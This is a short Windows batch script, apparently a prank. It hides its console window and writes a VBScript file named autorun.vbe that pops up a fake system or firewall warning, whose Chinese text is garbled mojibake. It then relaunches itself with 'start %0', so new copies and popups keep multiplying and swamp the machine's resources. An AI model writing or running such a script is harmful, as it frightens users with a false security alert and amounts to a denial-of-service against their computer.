@echo off
title= 
mode con cols=14 lines=1
@echo msgbox chr(13) + chr(13) + chr(13) + "Windowϵͳ����ǽ��⵽��没�����ף���ߣڣ����ϵͳ������������" >autorun.vbe
start autorun.vbe
ping -n 3 127.0>nul
start %0

